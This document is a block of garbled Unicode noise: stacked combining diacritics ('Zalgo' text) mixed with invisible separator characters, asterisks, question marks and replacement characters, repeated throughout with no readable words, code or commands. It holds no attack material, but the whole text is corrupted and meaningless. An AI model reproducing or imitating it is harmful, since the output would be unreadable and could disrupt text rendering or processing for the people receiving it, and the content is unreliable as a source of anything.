̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘